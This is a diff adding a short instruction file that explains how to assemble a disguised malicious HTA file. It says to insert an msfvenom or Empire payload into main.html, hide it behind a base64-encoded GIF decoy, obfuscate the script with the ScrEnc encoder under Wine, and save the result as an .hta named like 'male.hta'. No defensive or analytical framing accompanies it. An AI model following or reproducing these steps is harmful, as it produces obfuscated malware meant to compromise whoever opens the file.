@@ -1,0 +1,20 @@
+Create a payload in msfvenom or empire and put it in line 37 var payload="" - line 37 main.html
+Encode youre .gif in base64, you may use this site:
+https://www.browserling.com/tools/image-to-base64
+and put result in line 17 "data:image/gif;base64,-=>HERE<=-"];  main.html
+after you will nead wine and ScrEnc Encoder 3.0.3.7.msi (http://www.newfreeware.com/webmaster/526/download/)
+
+sudo add-apt-repository ppa:ricotz/unstable
+sudo apt remove wine wine1.8 wine-stable libwine* fonts-wine* && sudo apt autoremove
+sudo apt update
+sudo apt install wine-stable
+
+Then start ScrEnc Encoder 3.0.3.7.msi:
+
+wine msiexec /i ScrEnc\ Encoder\ 3.0.3.7.msi
+OR
+wine start ScrEnc Encoder 3.0.3.7.msi
+
+And put main.html in left side change option Script in 'Before': html/asp... then press Convert and save output in .hta format.
+like "male.hta"
+and here it is.
